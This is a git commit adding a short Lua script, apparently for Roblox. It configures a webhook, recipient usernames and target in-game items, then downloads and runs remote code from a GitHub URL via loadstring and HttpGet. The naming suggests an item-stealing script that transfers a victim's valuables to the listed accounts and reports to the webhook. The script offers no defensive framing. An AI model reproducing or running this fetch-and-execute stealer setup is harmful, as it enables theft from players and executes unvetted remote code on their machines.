7df356a44e85b0f02f7f891374fe7b261e27333d
wazure-spec <paulcampbellguyana9@gmail.com>
2025-03-23 20:32:33 -0400

    Create wazure.lua

---
+++ wazure.lua
@@ -0,0 +1,6 @@
+lua
+Webhook = "" -- << Your Webhook
+Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
